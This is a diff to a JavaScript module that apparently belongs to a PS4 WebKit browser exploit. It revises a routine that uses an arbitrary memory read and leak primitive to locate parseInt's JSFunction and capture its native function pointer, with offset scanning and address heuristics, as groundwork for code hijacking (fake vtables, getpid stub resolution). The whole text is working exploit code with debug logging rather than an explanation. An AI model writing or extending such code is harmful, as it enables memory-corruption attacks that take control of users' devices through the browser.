@@ -2,6 +2,7 @@
  * Direct stub entry — NO G0-G5 slab. Step logs + flush before each dangerous op.
  */
 import { int64 } from "./int64.js";
+import { getCoreNative } from "./core.js?v=stub-core-3";
 
 const COLLATOR_OFF = 0x18;
 const ARENA_BYTES = 0x1000;
@@ -9,9 +10,36 @@ const FAKE_UC = 0x100;
 const FAKE_VT = 0x300;
 const MARK_OFF = 0xf00;
 const SS_LAST = "wk-stub-last-step";
+const JSFUNC_EXECUTABLE_OFF = 0x18;
 
 function codeLooksNative(code4) {
     return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
+}
+
+function numToI64(n) {
+    if (n == null) return null;
+    if (typeof n === "object" && n != null && "low" in n)
+        return new int64(n.low >>> 0, (n.hi >>> 0));
+    if (typeof n === "string") {
+        const s = n.replace(/^0x/i, "").trim();
+        if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
+        if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
+        if (s.length < 16) return new int64(parseInt(s.slice(-8), 16) >>> 0, 0);
+        return new int64(
+            parseInt(s.slice(-8), 16) >>> 0,
+            parseInt(s.slice(0, -8), 16) >>> 0);
+    }
+    if (!Number.isFinite(n) || n <= 0) return null;
+    return new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
+}
+
+/** PS4 webkit fn ptr — 0x80–0x8f module range; don't require read4 probe. */
+function plausibleNativeFn64(p, ptr) {
+    if (!ptr) return false;
+    if (ptr.hi >= 0x80 && ptr.hi <= 0x8f) return true;
+    const q = read4p(p, ptr);
+    if (codeLooksNative(q)) return true;
+    return ptr.hi >= 0x8;
 }
 
 function read4p(p, addr) {
@@ -49,25 +77,92 @@ function stubCtx(opts) {
 }
 
 export function captureParseIntMainMf(p, off, opts) {
-    const { step } = stubCtx(opts || {});
+    opts = opts || {};
+    const { step } = stubCtx(opts);
     if (!p || typeof p.leakval !== "function")
         throw new Error("stub: no primitive p");
     if (!off) throw new Error("stub: no offset table (wrong UA?)");
+
+    const carrier = opts.carrier
+        || (typeof window !== "undefined" ? window._wkCarrier : null);
     const mOff = off.wk_JSFunction_m_function || 0x28;
+
+    const nat = getCoreNative(carrier);
+    if (nat) {
+        const exec = numToI64(nat.executable);
+        const tc = numToI64(nat.targetCell);
+        let mainOrig = numToI64(nat.nativeFn);
+        if (exec && tc) {
+            const mainMf = exec.add32(mOff);
+            if (!mainOrig || !plausibleNativeFn64(p, mainOrig)) {
+                try { mainOrig = p.read8(mainMf); } catch (_) { mainOrig = null; }
+            }
+            if (mainOrig && plausibleNativeFn64(p, mainOrig)) {
+                const probe = read4p(p, mainOrig);
+                step("STUB-CAP0", "carrier.native exec=" + exec + " fn=" + mainOrig);
+                step("STUB-CAP3", "mainMf=" + mainMf + " orig=" + mainOrig
+                    + " probe=0x" + (probe != null ? probe.toString(16) : "skip"));
+                return {
+                    cell: tc,
+                    jfn: exec,
+                    mainMf,
+                    mainOrig,
+                    nativeFn: mainOrig,
+                    path: "carrier-native",
+                };
+            }
+            step("STUB-CAP0", "carrier.native bad fn=" + mainOrig + " — scan");
+        }
+    } else {
+        step("STUB-CAP0", "no carrier.native — scan parseInt");
+    }
+
     step("STUB-CAP1", "leakval parseInt");
     const cell = p.leakval(parseInt);
     step("STUB-CAP2", "cell=" + cell);
-    const jfn = p.read8(cell.add32(0x18));
+    const jfn = p.read8(cell.add32(JSFUNC_EXECUTABLE_OFF));
     if (!jfn) throw new Error("stub: no exec @ parseInt+0x18");
-    const mainMf = jfn.add32(mOff);
-    const mainOrig = p.read8(mainMf);
-    if (!mainOrig) throw new Error("stub: mainOrig read failed @ " + mainMf);
+
+    const cands = [];
+    const scanOffs = [mOff, 0x20, 0x28, 0x30, 0x38, 0x8, 0x10];
+    for (let i = 0; i < scanOffs.length; i++) {
+        const o = scanOffs[i];
+        let fn = null;
+        try { fn = p.read8(jfn.add32(o)); } catch (_) { fn = null; }
+        if (fn) cands.push({ o, fn });
+    }
+
+    let pick = null;
+    for (let i = 0; i < cands.length; i++) {
+        if (plausibleNativeFn64(p, cands[i].fn)) {
+            pick = cands[i];
+            break;
+        }
+    }
+    if (!pick && cands.length) pick = cands[0];
+
+    if (!pick) throw new Error("stub: mainMf capture failed — no candidates @ jfn=" + jfn);
+
+    const mainMf = jfn.add32(pick.o);
+    const mainOrig = pick.fn;
     const probe = read4p(p, mainOrig);
-    step("STUB-CAP3", "mainMf=" + mainMf + " orig=" + mainOrig + " probe=0x"
-        + (probe != null ? probe.toString(16) : "null"));
-    if (!codeLooksNative(probe))
-        throw new Error("stub: mainOrig not code");
-    return { cell, jfn, mainMf, mainOrig, nativeFn: mainOrig };
+    step("STUB-CAP3", "mainMf=" + mainMf + " orig=" + mainOrig
+        + " off=0x" + pick.o.toString(16)
+        + " probe=0x" + (probe != null ? probe.toString(16) : "null")
+        + (plausibleNativeFn64(p, mainOrig) ? " OK" : " WEAK"));
+
+    if (!plausibleNativeFn64(p, mainOrig))
+        throw new Error("stub: mainOrig not code orig=" + mainOrig
+            + " probe=0x" + (probe != null ? probe.toString(16) : "null"));
+
+    return {
+        cell,
+        jfn,
+        mainMf,
+        mainOrig,
+        nativeFn: mainOrig,
+        path: "scan+0x" + pick.o.toString(16),
+    };
 }
 
 export function resolveGetpidStub(lk, off, prefer) {
